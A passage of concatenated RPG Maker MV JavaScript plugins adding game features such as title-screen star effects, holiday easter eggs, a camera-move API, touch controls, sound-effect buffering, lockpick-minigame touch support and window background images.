	}
	this.updateOpacity();
	return rtv;
}).add('updateOpacity',function f(){
	if(this._opacityDur<this._opacityDurDst){
		this._opacity=++this._opacityDur/this._opacityDurDst*(this._opacityDst-this._opacitySrc)+this._opacitySrc;
	}else this._opacityDst=this._opacitySrc=this._opacityDur=this._opacityDurDst=undefined;
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 標題水波+星星
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
[undefined,undefined,8,4,32,16], // touch x, touch y, thickness, speed, dur, fadeDur
2, // 1: gen interval
star=>{
	star.x+=star._v[0];
	star.y+=star._v[1];
	star._v[0]+=star._a[0];
	star._v[1]+=star._a[1];
	star.rotation+=star._rot;
	star.alpha=star._dur/star._durMax;
	return !(0<--star._dur);
},
function(star){
	this.removeChild(star);
	this._stars.uniquePop(star);
},
[0,0,255], // 4: color tone
];

new cfc(Scene_Title.prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._choices[this._choiceIdx].apply(this);
	//this.update_water();
	this.update_star(true);
	return rtv;
}).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	f.tbl[0][1]=f.tbl[0][0]=undefined;
	this._nextGenTime=0;
	this._stars=[];
	this._choiceIdx=0;
	this._choices=[this.update_water,this.update_star];
	return rtv;
},t).add('update_water',function f(){
	if(!$gameScreen) return;
	const lastX=f.tbl[0][0],lastY=f.tbl[0][1];
	f.tbl[0][0]=TouchInput.x;
	f.tbl[0][1]=TouchInput.y;
	if(!TouchInput.isTriggered()&&((f.tbl[0][0]===lastX&&f.tbl[0][1]===lastY)||this._nextGenTime>=Graphics.frameCount)) return;
	$gameScreen.radiusWaveEffect_gen.apply($gameScreen,f.tbl[0]);
	this._nextGenTime=Graphics.frameCount+f.tbl[1];
	++this._choiceIdx; this._choiceIdx%=this._choices.length;
},t).add('update_star',function f(dontGen){
	const lastX=f.tbl[0][0],lastY=f.tbl[0][1];
	f.tbl[0][0]=TouchInput.x;
	f.tbl[0][1]=TouchInput.y;
	const arr=this._stars.filter(f.tbl[2]).reverse();
	arr.forEach(f.tbl[3],this);
	if(dontGen) return;
	if(!TouchInput.isTriggered()&&((f.tbl[0][0]===lastX&&f.tbl[0][1]===lastY)||this._nextGenTime>=Graphics.frameCount)) return;
	this._nextGenTime=Graphics.frameCount+f.tbl[1];
	const sp=new Sprite(ImageManager.loadNormalBitmap('img/system/IconSet.png'));
	sp.x=TouchInput.x;
	sp.y=TouchInput.y;
	sp._v=[Math.random()*4-2,-Math.random()*2-1];
	sp._a=[0,0.125];
	sp._rot=(Math.random()*2-1)*Math.PI/64;
	sp._dur=sp._durMax=~~(Math.random()*64)+16;
	sp._iconIndex=92;
	Sprite_StateIcon.prototype.updateFrame.apply(sp);
	SceneManager._scene.addChild(sp);
	this._stars.push(sp);
	++this._choiceIdx; this._choiceIdx%=this._choices.length;
	sp.setColorTone(f.tbl[4]);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc bypass isMaxBuffAffected
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw="unlimitedBuffAffected";

new cfc(Game_BattlerBase.prototype).add('isMaxBuffAffected',function f(){
	const data=this.getData && this.getData();
	const meta=data&&data.meta;
	if(meta && meta[f.tbl[0]]) return false;
	return f.ori.apply(this,arguments);
},[
kw,
]);

})();


﻿"use strict";
/*:
 * @plugindesc 愚人節
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const dt=new Date();
const m=dt.getMonth(); // 0-base
const d=dt.getDate(); // 1-base
const cond=(m===2&&d===31)||(m===3&&d<9)||Utils.isOptionValid('aprilfools');
if(!cond) return;

t=[
// 0: common event id
40401,
// 1: common event
{"id":0,"list":[{"code":355,"indent":0,"parameters":["{ const p=Game_Message.prototype;"]},{"code":655,"indent":0,"parameters":["const r=p.allText._anonymousModeBak||p.allText;"]},{"code":655,"indent":0,"parameters":["(p.allText=function f(){"]},{"code":655,"indent":0,"parameters":[" let rtv=f._anonymousModeBak.apply(this,arguments);"]},{"code":655,"indent":0,"parameters":[" if($gameSystem && $gameSystem._anonymousMode) rtv=rtv.replace(/^\\\\N\\[[0-9]+\\](?=($|\\n))/,\"\\\\CHANGEFACE\\\"0|BLR_01_1|8964\\\"\");"]},{"code":655,"indent":0,"parameters":[" return rtv;"]},{"code":655,"indent":0,"parameters":["})._anonymousModeBak=r;"]},{"code":655,"indent":0,"parameters":["}"]},{"code":101,"indent":0,"parameters":["",0,0,2]},{"code":401,"indent":0,"parameters":["\\TXTCENTER:\"是否開啟匿名說話模式？\"\n\n開啟後，當對話視窗第一排字為資料庫角色名稱(\\\\N[*])時，\n會將第一排字消除，並將臉圖清空。"]},{"code":102,"indent":0,"parameters":[["不變更設定","開啟","關閉"],0,0,2,0]},{"code":402,"indent":0,"parameters":[0,"不變更設定"]},{"code":0,"indent":1,"parameters":[]},{"code":402,"indent":0,"parameters":[1,"開啟"]},{"code":355,"indent":1,"parameters":["$gameSystem._anonymousMode=1;"]},{"code":0,"indent":1,"parameters":[]},{"code":402,"indent":0,"parameters":[2,"關閉"]},{"code":355,"indent":1,"parameters":["$gameSystem._anonymousMode=0;"]},{"code":0,"indent":1,"parameters":[]},{"code":404,"indent":0,"parameters":[]},{"code":0,"indent":0,"parameters":[]}],"name":"","switchId":1,"trigger":0},
// 2: item id
40401,
// 3: item
{
"id":0,"animationId":0,"consumable":false,"damage":{"critical":false,"elementId":0,"formula":"0","type":0,"variance":20},
"description":"全新的遊戲體驗。\n此為\\C[6]愚人節\\C[0]期間及附近，自動出現與消失的限定道具。",
"effects":[{"code":44,"dataId":"匿名說話模式commonEvtId","value1":0,"value2":0}],"hitType":0,"iconIndex":189,"itypeId":2,
"name":"\\STYLEDTEXT.\\}\\C[6][愚人節]\\C[0]\\{匿名說話模式",
"note":"","occasion":2,"price":0,"repeats":1,"scope":0,"speed":0,"successRate":100,"tpGain":0,
"meta":{
道具額外文字檔:"data:text/plain;base64,5oSa5Lq656+A5pyf6ZaT6ZmE6L+R6ZmQ5a6aDQoNClx7XHsgXFRYVENFTlRFUjoi5Yy/5ZCN6Kqq6Kmx5qih5byPIiBcfVx9DQoNCuS9oOiDveWIhuWHuuS+huiqsOWcqOiqquipseWXju+8nw0K",
},
"maxStack":1
},
// 4: exp x64 when dead
[
	// states
	function(dataobj,i){ if(!dataobj) return;
		if(!(DateNow<TR404)&&i===1){
			dataobj.traits.forEach(t=>t&&t.code===Game_BattlerBase.TRAIT_SPARAM&&(t.value=Math.max(64,t.value)||64));
			dataobj.traits.push({code:Game_BattlerBase.TRAIT_SPARAM,dataId:9,value:64}); // exr === exp rate
		}
	},
],
undefined, // 5: triggered:modified
undefined, // 6: triggered:printMsg
// 7: msg
[
"\\C[6]特殊節日！！！\n\\C[0]倒下的隊員的經驗值倍率\n大幅提升！！！", // 7-0: msg str
undefined, // 7-1: msg opt
],
];

new cfc(Scene_Boot.prototype).add('start',function f(){
	this.start_putCustom_aprilFools();
	return f.ori.apply(this,arguments);
}).add('start_putCustom_aprilFools',function f(){
	$dataCommonEvents[f.tbl[0]]=f.tbl[1];
	f.tbl[1].id=f.tbl[0];
	$dataItems[f.tbl[2]]=f.tbl[3];
	f.tbl[3].id=f.tbl[2];
	$dataItems[f.tbl[2]].effects[0].dataId=[f.tbl[0]];
	if(!Utils.isOptionValid('test')){
		$dataStates.forEach(f.tbl[4][0],this);
		f.tbl[5]=true; // checked in Scene_Title.prototype.start
	}
},t);

new cfc(Scene_Title.prototype).
add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.start_aprilFools_printMsg();
	return rtv;
}).
add('start_aprilFools_printMsg',function f(){
	if(f.tbl[6]) return;
	f.tbl[6]=true;
	if(!f.tbl[5]) return;
	$gameTemp.popupMsg(f.tbl[7][0],f.tbl[7][1]);
},t).
getP;

new cfc(SceneManager).add('update',function f(){
	this.update_aprilFools();
	return f.ori.apply(this,arguments);
}).add('update_aprilFools',function f(){
	if(!this.isScene_map()||!$gameParty||!$gameParty._items) return;
	if(!$gameParty._items[f.tbl[2]]) $gameParty._items[f.tbl[2]]=1;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 10-10 day
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const dt=new Date();
const m=dt.getMonth(); // 0-base
const d=dt.getDate(); // 1-base
const cond=m===9&&d===10;
if(!cond) return;

new cfc(Scene_Boot.prototype).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.start_putCustom_tenTenDay();
}).add('start_putCustom_tenTenDay',function f(){
	if(confirm(f.tbl[0])) $dataActors.forEach(f.tbl[1]);
},[
"是否啟動 10/10 彩蛋:\n 我方角色每下受擊固定以10做計算。",
dataobj=>{
	const meta=dataobj&&dataobj.meta;
	if(!meta||meta.fixedDamaged) return;
	meta.fixedDamaged='10';
}, // 0: 
]);

})();


﻿"use strict";
/*:
 * @plugindesc 移動攝影機API
 * @author agold404
 * @help $gameMap.moveCam(evtId,dx,dy,dur,smooth?,outOfBound?);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Map.prototype).add('moveCam',function f(evtId_or_chr,dx,dy,dur,isSmooth,canOutOfBound){
	const p=$gamePlayer;
	const ref=(evtId_or_chr instanceof Game_Character)?evtId_or_chr:(evtId_or_chr==='p'?p:this._events[evtId_or_chr]);
	const dstX=(ref?ref._realX:0)+dx-p.centerX();
	const dstY=(ref?ref._realY:0)+dy-p.centerY();
	if(!(0<(dur|=0))) this.update_moveCam_fin();
	else this._moveCam={
		smooth:isSmooth,
		srcX:this._displayX,
		srcY:this._displayY,
		dstX:dstX,
		dstY:dstY,
		dur:dur,
		durMax:dur,
		oob:canOutOfBound,
	};
},undefined,true,true).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_moveCam();
	return rtv;
}).add('update_moveCam',function f(){
	const info=this._moveCam;
	if(!info) return;
	if(!(0<info.dur)) return this.update_moveCam_fin();
	const ro=info.dur/info.durMax;
	const r=info.smooth?(Math.cos(ro*Math.PI)+1)/2.0:1-ro;
	this._displayX=(info.dstX-info.srcX)*r+info.srcX;
	this._displayY=(info.dstY-info.srcY)*r+info.srcY;
	--info.dur;
}).add('update_moveCam_fin',function f(){
	const info=this._moveCam;
	if(!info) return;
	this._moveCam=undefined;
	this._displayX=info.dstX;
	this._displayY=info.dstY;
});

})();


﻿"use strict";
/*:
 * @plugindesc 畫面方向鍵
 * @author agold404
 * @help TouchInput.screenTouchInput_showIfTouched(); TouchInput.screenTouchInput_hide();
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(TouchInput).add('screenTouchInput_get',function f(){
	let rtv=this._screenTouchInput;
if(!rtv){
rtv=this._screenTouchInput=document.ce('div');
const d=document,lg="linear-gradient(%%deg,rgba(0,0,0,0) 50%,rgba(255,255,255,0.5))",evtCommon=(e,k,v,touched)=>{
	if(e.type!=='touchcancel') e.preventDefault();
	Input._currentState[k]=v;
	e.target.sa('class',touched?"screentouchinput_ontouch":"");
},addEvt=(div,start,end)=>{
	div.ontouchstart=start;
	div.ontouchend=end;
	div.ontouchleave=end;
	div.ontouchcancel=end;
};
rtv.width=Graphics.boxWidth;
rtv.height=Graphics.boxHeight;
rtv.style.zIndex=3;
rtv.style.userSelect="none";
rtv.ac(d.ce('style').atxt(".screentouchinput_ontouch{background-color:rgba(255,255,255,0.25);}"));

const left=d.ce('div');
{ let div=left,css=div.style;
css.position="absolute";
css.left="0px";
css.top="0px";
css.right="50%";
css.bottom="0px";
css.backgroundImage=lg.replace("%%","270");
css.clipPath="polygon(1% 1%, 50% 25%, 50% 75%, 1% 99%)";
css.userSelect="none";
const start=e=>evtCommon(e,'left',1,1);
const end=e=>evtCommon(e,'left',0,0);
addEvt(div,start,end);
rtv.ac(div);
}

const right=d.ce('div');
{ let div=right,css=div.style;
css.position="absolute";
css.left="50%";
css.top="0px";
css.right="0px";
css.bottom="0px";
css.backgroundImage=lg.replace("%%","90");
css.clipPath="polygon(99% 99%, 50% 75%, 50% 25%, 99% 1%)";
css.userSelect="none";
const start=e=>evtCommon(e,'right',1,1);
const end=e=>evtCommon(e,'right',0,0);
addEvt(div,start,end);
rtv.ac(div);
}

const top=d.ce('div');
{ let div=top,css=div.style;
css.position="absolute";
css.left="0px";
css.top="0px";
css.right="0px";
css.bottom="50%";
css.backgroundImage=lg.replace("%%","0");
css.clipPath="polygon(99% 1%, 75% 50%, 25% 50%, 1% 1%)";
css.userSelect="none";
const start=e=>evtCommon(e,'up',1,1);
const end=e=>evtCommon(e,'up',0,0);
addEvt(div,start,end);
rtv.ac(div);
}

const btm=d.ce('div');
{ let div=btm,css=div.style;
css.position="absolute";
css.left="0px";
css.top="50%";
css.right="0px";
css.bottom="0px";
css.backgroundImage=lg.replace("%%","180");
css.clipPath="polygon(1% 99%, 25% 50%, 75% 50%, 99% 99%)";
css.userSelect="none";
const start=e=>evtCommon(e,'down',1,1);
const end=e=>evtCommon(e,'down',0,0);
addEvt(div,start,end);
rtv.ac(div);
}
} // !rtv
	return rtv;
}).add('screenTouchInput_showIfTouched',function f(){
	if(!this._touched) return;
	const div=this.screenTouchInput_get();
	if(!div.parentNode){
		document.body.ac(div);
		Graphics.addAsGameCanvas(div);
		//Graphics._updateAsGameCanvas();
	}
	if(this._screenTouchInput_isShown===true) return;
	this._screenTouchInput_isShown=true;
	div.style.display="block";
}).add('screenTouchInput_hide',function f(){
	if(!this._screenTouchInput) return;
	if(this._screenTouchInput_isShown===false) return;
	this._screenTouchInput_isShown=false;
	this._screenTouchInput.style.display="none";
}).add('update',function f(){
	const sc=SceneManager._scene; if(!sc||sc.constructor!==Scene_Map) this.screenTouchInput_hide();
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc overwrite AudioManager.playSe, stopSe, StaticSe
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

AudioManager._seBuffers=new Queue(64);
AudioManager._seCurrentFrame=new Map();
AudioManager._staticBufferMap=new Map();
new cfc(AudioManager).add('playSe',function f(se){
	const n=se&&se.name;
	if(n){
		if(!this.seCurrentFrame_add(n)) return;
		if(this._seBuffers.constructor!==Queue) this._seBuffers=new Queue(this._seBuffers);
		const q=this._seBuffers;
		while(q.length && q[0] && (q[0].isError()||( q[0].isReady()&&!q[0].isPlaying() )) ) q.pop();
		const buffer = this.createBuffer('se', n);
		this.updateSeParameters(buffer, se);
		buffer.play(false);
		this._seBuffers.push(buffer);
	}
},undefined,false,true).add('stopSe',function f(){
	this._seBuffers.forEach(f.tbl[0]);
	this._seBuffers.length=0;
},[
function(buffer){ buffer.stop(); },
],false,true).add('playStaticSe',function f(se){
	const buffer=this.loadStaticSe(se);
	if(buffer){
		buffer.stop();
		this.updateSeParameters(buffer,se);
		buffer.play(false);
	}
},undefined,false,true).add('loadStaticSe',function f(se){
	const n=se&&se.name;
	let buffer=this._staticBufferMap.get(n);
	if(buffer) return buffer;
	buffer=this.createBuffer('se', n);
	buffer._reservedSeName=n;
	this._staticBufferMap.set(n,buffer);
	if(this.shouldUseHtml5Audio()) Html5Audio.setStaticSe(buffer._url);
	return buffer;
},undefined,false,true).add('isStaticSe',function f(se){
	const n=se&&se.name; if(!n) return;
	return this._staticBufferMap.has(n);
},undefined,false,true).add('seCurrentFrame_add',function f(n){
	const scf=this._seCurrentFrame;
	const c=scf.get(n)|0; if(c>=f.tbl[0]) return false;
	scf.set(n,c+1);
	return true;
},[
2,
],false,true).add('seCurrentFrame_clear',function f(){
	this._seCurrentFrame.clear();
});

{ let p;
try{ p=PIXI.ticker.shared; }catch(e){ p=SceneManager; }
new cfc(p).add('update',function f(){
	AudioManager.seCurrentFrame_clear();
	return f.ori.apply(this,arguments);
});
}

})();


﻿"use strict";
/*:
 * @plugindesc 幫lockpick加觸控
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Scene_Boot.prototype).add('start',function f(){
	
if(typeof Window_Lockpick==='function') new cfc(Window_Lockpick.prototype).add('processHandling',function f(){
	const center=this._lockSprite,sp=this._leftStick; if(!sp) return f.ori.apply(this,arguments);
	
	const isCancelled=TouchInput.isCancelled();
	const isTriggered=TouchInput.isTriggered();
	const isPressed=TouchInput.isPressed();
	const cancel=isCancelled;
	let ok=false;
	if(isPressed){
		const centerPos=center.getGlobalPosition();
		const x=TouchInput.x-centerPos.x;
		const y=TouchInput.y-centerPos.y;
		if(center._getProperFullRect(0,0).contains(x,y)) ok=true;
		else if(isTriggered){
			const spPos=sp.getGlobalPosition();
			// 垂直當0, 畫面順時針轉90度
			const dx=spPos.y-TouchInput.y;
			const dy=TouchInput.x-spPos.x; // 順時針轉為正
			if(dx>0){
				const rad=Math.atan(dy/dx); 
				sp.rotation=Math.PI+rad;
			}else sp.rotation=(dy<0?0.5:-0.5)*Math.PI;
			this.setLockPosition();
			this.positSound();
		}
	}else ok=false;
	
	const del1=f.tbl[0](pxd_lp_delete_1);
	const del2=f.tbl[0](pxd_lp_delete_2);
	const lol=f.tbl[0](pxd_lp_lo_left);
	const lor=f.tbl[0](pxd_lp_lo_right);
	Input._currentState[del1]=0;
	Input._currentState[del2]=0;
	if(this._last_isPressed && !isPressed){
		Input._currentState[lol]=0;
		Input._currentState[lor]=0;
	}
	if(cancel && !this._cancelled){
		this._cancelled=true;
		Input._currentState[del1]=1;
		Input._currentState[del2]=1;
	}else if(ok && !this._cancelled){
		Input._currentState[lol]=1;
		Input._currentState[lor]=1;
	}
	
	const rtv=f.ori.apply(this,arguments);
	
	if(this._cancelled){
		Input._currentState[del1]=0;
		Input._currentState[del2]=0;
		Input._currentState[lol]=0;
		Input._currentState[lor]=0;
	}
	
	this._last_isPressed=isPressed;
	return rtv;
},[
s=>Input._isEscapeCompatible(s)?"escape":s,
]);
	
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc BattleManager 中途加入幫 call onBattleStart ; 曾經 onBattleStart 者 call onBattleEnd
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(BattleManager).add('joinedBattlers',function f(){
	return this._joinedBattlers||(this._joinedBattlers=[]);
},undefined,false,true).add('startBattle',function f(){
	this.joinedBattlers().uniqueClear();
	return f.ori.apply(this,arguments);
}).add('endBattle',function f(){
	this.joinedBattlers().slice().forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
btlr=>btlr.constructor!==Game_Enemy && btlr.onBattleEnd(), // enemies will be cleared in scene.terminate()
]);

new cfc(Game_Battler.prototype).add('onBattleStart',function f(){
	BattleManager.joinedBattlers().uniquePush(this);
	return f.ori.apply(this,arguments);
}).add('onBattleEnd',function f(){
	const s=BattleManager.joinedBattlers();
	if(!s.uniqueHas(this)) return;
	s.uniquePop(this);
	return f.ori.apply(this,arguments);
});

t=[
btlr=>btlr.onBattleStart(),
];
new cfc(Game_Party.prototype).add('addActor',function f(actorId){
	// if large amount, change to uniquePush
	const isInBattle=this.inBattle();
	const s0=isInBattle&&new Set(this.members());
	const rtv=f.ori.apply(this,arguments);
	const s1=isInBattle&&new Set(this.members());
	if(s1) s1.minus_inplace(s0).forEach(f.tbl[0]);
	return rtv;
},t).add('removeActor',function f(actorId){
	// if large amount, change to uniquePop
	const isInBattle=this.inBattle();
	const s0=isInBattle&&new Set(this.members());
	const rtv=f.ori.apply(this,arguments);
	const s1=isInBattle&&new Set(this.members());
	if(s1) s1.minus_inplace(s0).forEach(f.tbl[0]);
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc tune YEP: skill has reserveAtb property
 * @author agold404
 * @help note: <reserveAtb>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(BattleManager).add('endAction',function f(){
	const a=this._action;
	const s=a&&a.subject();
	const skill=s&&a.isSkill()&&a.item();
	const atb=skill&&skill.meta.reserveAtb&&s._atbSpeed;
	const rtv=f.ori.apply(this,arguments);
	if(atb) s._atbSpeed=atb;
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 文字換視窗背景
 * @author agold404
 * @help \BGIMG"id|z軸|路徑|類型|alpha|原點x|原點y|伸縮x比例|伸縮y比例|參考寬|參考高|起始x比例|起始y比例"
 * \BGIMG"id|z軸|路徑|延展|alpha"
 * 
基本參數大概是
- 自訂 id 。同時顯示多個圖片背景時要使用不同 id 。
- z 軸。多個圖片的上下層依據，數值越小的在越底下。不是填數字則視為 0 。
- 檔案路徑
- 類型。同 Windows 桌面：
  - 延展: 圖片填滿整個視窗
  - 置中: 圖片以原點放在窗內起始位置
    - 圖內原點設在圖片中心、參考視窗內起始設為參考1單位視窗的一半，就是置中。
    - 你也可以很有病的把參考視窗內起始放在邊邊甚至出界。
  - 重複: 圖片以原點從窗內起始位置開始填滿視窗
  - 置中切: 同置中，但會切出界。

接下來是怎麼調會比較方便要加ㄉ參數，不一定都會加上去
- 圖片 alpha 值(不透明度)。 0 到 1 。預設 1 。
- 圖內原點 x 座標(置中/重複用ㄉ)。以原始圖片大小為準。預設圖片正中心。
- 圖內原點 y 座標(置中/重複用ㄉ)。以原始圖片大小為準。預設圖片正中心。
- 圖片伸縮 x 比例(置中/重複用ㄉ)。以以上設定的原點為中心伸縮。預設 1 。
- 圖片伸縮 y 比例(置中/重複用ㄉ)。以以上設定的原點為中心伸縮。預設 1 。
- 參考 1 單位視窗寬。依據視窗實際寬度除上該值，為圖片寬的_伸縮比例_。填入非數字就是當下視窗寬=預設。計算後的_伸縮比例_與圖片伸縮 x 比例相乘。(置中/重複用ㄉ)
- 參考 1 單位視窗高。依據視窗實際高度除上該值，為圖片高的_伸縮比例_。填入非數字就是當下視窗高=預設。計算後的_伸縮比例_與圖片伸縮 y 比例相乘。(置中/重複用ㄉ)
- 參考視窗內起始 x 比例(置中/重複用ㄉ)。預設 0.5 ，正中間。
- 參考視窗內起始 y 比例(置中/重複用ㄉ)。預設 0.5 ，正中間。

預計輸入方式：
`\BGIMG"` _**id**_ `|` _**z軸**_ `|` _**路徑**_ `|` _**類型**_  `|` _**alpha**_  `|` _**原點x**_ `|` _**原點y**_ `|` _**伸縮x比例**_ `|` _**伸縮y比例**_ `|` _**參考寬**_ `|` _**參考高**_ `|` _**起始x比例**_ `|` _**起始y比例**_ `"` ```txt
\BGIMG"id|z軸|路徑|類型|alpha|原點x|原點y|伸縮x比例|伸縮y比例|參考寬|參考高|起始x比例|起始y比例"
```
延展的話只要填這樣：
`\BGIMG"` _**id**_ `|` _**z軸**_ `|` _**路徑**_ `|延展|` _**alpha**_  `"` ```txt
\BGIMG"id|z軸|路徑|延展|alpha"
```

只有1張圖的話id和z軸都填0或都隨便填就好
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
"BGIMG",
[/\\/g,/^[ \t]*|[ \t]*$/,], // 1: replacing matcher
(n,d)=>{
	const rtv=n-0;
	return !n||isNaN(rtv)?d:rtv;
}, // 2: to num with default
{
alpha:1,
imgax:0.5,
imgay:0.5,
imgsx:1,
imgsy:1,
wndax:0.5,
wnday:0.5,
}, // 3: default
function(wnd,bmp){
	if(this._img!==bmp) return;
	wnd.bgImg_setupSp(this);
}, // 4: onImgLoad
"延展", // 5: bypass
{
"延展":"bgImg_setupSp_延展",
"置中":"bgImg_setupSp_置中",
"指定":"bgImg_setupSp_置中",
"重複":"bgImg_setupSp_重複",
"置中切":"bgImg_setupSp_置中切",
"指定切":"bgImg_setupSp_置中切",
}, // 6: type to setup func
function(imgsp){
	const imgf=imgsp._frame; if(!imgf) return; // ????
	const frm=new Rectangle(imgf.x,imgf.y,imgf.width,imgf.height);
	const imgs=imgsp.scale; if(!imgs.x||!imgs.y) return; // ????
	const sp=this;
	const imgb=imgsp.bitmap;
	const imgw=imgs.x*imgb.width;
	const imgh=imgs.y*imgb.height;
	const imgp=imgsp.position;
	let imgx0=imgp.x,imgxe=imgx0+imgw; if(imgxe<imgx0){ let tmp=imgx0; imgx0=imgxe; imgxe=tmp; }
	let imgy0=imgp.y,imgye=imgy0+imgh; if(imgye<imgy0){ let tmp=imgy0; imgy0=imgye; imgye=tmp; }
	let imgx=imgsp.x;
	let imgy=imgsp.y;
	if(imgx0<sp._x0){
		const dx=(sp._x0-imgx0)/imgs.x;
		if(imgs.x<0) frm.width+=dx;
		else{
			frm.width-=dx;
			frm.x+=dx;
			imgx+=dx*imgs.x;
		}
	}
	if(imgy0<sp._y0){
		const dy=(sp._y0-imgy0)/imgs.y;
		if(imgs.y<0) frm.height+=dy;
		else{
			frm.height-=dy;
			frm.y+=dy;
			imgy+=dy*imgs.y;
		}
	}
	if(sp._xe<imgxe){
		const dx=(imgxe-sp._xe)/imgs.x;
		if(imgs.x<0){
			frm.width+=dx;
			frm.x-=dx;
			imgx+=dx*imgs.x;
		}else frm.width-=dx;
	}
	if(sp._ye<imgye){
		const dy=(imgye-sp._ye)/imgs.y;
		if(imgs.y<0){
			frm.height+=dy;
			frm.y-=dy;
			imgy+=dy*imgs.y;
		}else frm.height-=dy;
	}
	imgp.set(imgx,imgy);
	imgsp.setFrame(frm.x,frm.y,frm.width,frm.height);
}, // 7: 切邊
];

new cfc(Window_Base.prototype).add('processEscapeCharacter',function f(code,textState){
	return (code===f.tbl[0])?this.changeBgImg(this.processCStyleStringContent(textState)):f.ori.apply(this,arguments);
},t).add('changeBgImg',function f(infoStr){
	if(!infoStr) return;
	const infos=infoStr.split("|");
	const id=infos[0];
	const z=infos[1]-0||0;
	const path=infos[2].replace(f.tbl[1][0],'/');
	const type=infos[3].replace(f.tbl[1][1],'');
	const alpha=f.tbl[2](infos[4],f.tbl[3].alpha);
	const imgax=f.tbl[2](infos[5],f.tbl[3].imgax);
	const imgay=f.tbl[2](infos[6],f.tbl[3].imgay);
	const imgsx=f.tbl[2](infos[7],f.tbl[3].imgsx);
	const imgsy=f.tbl[2](infos[8],f.tbl[3].imgsy);
	const rwndw=f.tbl[2](infos[9],this.width);
	const rwndh=f.tbl[2](infos[10],this.height);
	const wndax=f.tbl[2](infos[11],f.tbl[3].wndax);
	const wnday=f.tbl[2](infos[12],f.tbl[3].wnday);
	
	const sp=this.bgImg_getSp(id);
	sp._bgImgZ=z;
	sp._img=ImageManager.loadNormalBitmap(path);
	sp._type=type;
	sp.alpha=alpha;
	if(sp._type===f.tbl[5]){
		sp._imgax=0;
		sp._imgay=0;
		sp._imgsx=1;
		sp._imgsy=1;
		sp._rwndw=1;
		sp._rwndh=1;
		sp._wndax=0;
		sp._wnday=0;
		
		sp._x0=0;
		sp._y0=0;
		sp._xe=0;
		sp._ye=0;
	}else{
		sp._imgax=imgax;
		sp._imgay=imgay;
		sp._imgsx=imgsx;
		sp._imgsy=imgsy;
		sp._rwndw=rwndw;
		sp._rwndh=rwndh;
		sp._wndax=wndax;
		sp._wnday=wnday;
		sp.scale.set(this.width/rwndw,this.height/rwndh);
		
		const xo=sp._wndax*sp._rwndw;
		const yo=sp._wnday*sp._rwndh;
		sp._x0=0-xo;
		sp._y0=0-yo;
		sp._xe=sp._rwndw-xo;
		sp._ye=sp._rwndh-yo;
	}
	
	sp._img.addLoadListener(f.tbl[4].bind(sp,this));
},t).add('bgImg_getCont',function f(){
	if(!this._bgImgRoot){
		this._windowSpriteContainer.addChildAt(this._bgImgRoot=new Sprite(),0);
		this.bgImg_updateRootPlacement();
		this._bgImgRoot._id2sp=new Map();
	}
	return this._bgImgRoot;
},t).add('bgImg_updateRootPlacement',function f(){
	this._bgImgRoot.y=-this._windowSpriteContainer.y; // match y=0 in 'this'
},t).add('bgImg_getSp',function f(id){
	const m=this.bgImg_getCont()._id2sp;
	let sp=m.get(id); if(!sp) m.set(id,sp=new Sprite());
	return sp;
},t).add('bgImg_setupSp_延展',function f(sp){
	sp.position.set(0,0);
	sp.anchor.set(0,0);
	sp.scale.set(this.width/sp._img.width,this.height/sp._img.height);
	sp.bitmap=sp._img;
},t).add('bgImg_setupSp_置中',function f(sp){
	const imgsp=new Sprite(sp._img);
	sp.addChild(imgsp);
	const imgdx=-sp._imgax*sp._imgsx*sp._img.width;
	const imgdy=-sp._imgay*sp._imgsy*sp._img.height;
	//imgsp.anchor.set(sp._imgax,sp._imgay);
	imgsp.scale.set(sp._imgsx,sp._imgsy);
	imgsp.position.set(imgdx,imgdy);
},t).add('bgImg_setupSp_重複',function f(sp){
	const xo=-sp._x0;
	const yo=-sp._y0;
	const ws=sp._img.width*sp._imgsx;
	const hs=sp._img.height*sp._imgsy;
	let x0b=xo-ws*sp._imgax,x0e=x0b+ws; if(x0e<x0b){ let tmp=x0b; x0b=x0e; x0e=tmp; }
	let y0b=yo-hs*sp._imgay,y0e=y0b+hs; if(y0e<y0b){ let tmp=y0b; y0b=y0e; y0e=tmp; }
	const w=Math.abs(ws);
	const h=Math.abs(hs);
	const imgdx=-ws*sp._imgax;
	const imgdy=-hs*sp._imgay;
	for(let y=yo-Math.ceil((y0b-0)/h)*h,ye=Math.max(yo+Math.ceil((sp._rwndh-y0e)/h)*h,y)+h,
		xb=xo-Math.ceil((x0b-0)/w)*w,xe=Math.max(xo+Math.ceil((sp._rwndw-x0e)/w)*w,xb)+w;y<ye;y+=h){
		for(let x=xb;x<xe;x+=w){
			const imgsp=new Sprite(sp._img);
			//imgsp.anchor.set(sp._imgax,sp._imgay); // use calc. translate manually (imgdx,imgdy)
			imgsp.scale.set(sp._imgsx,sp._imgsy);
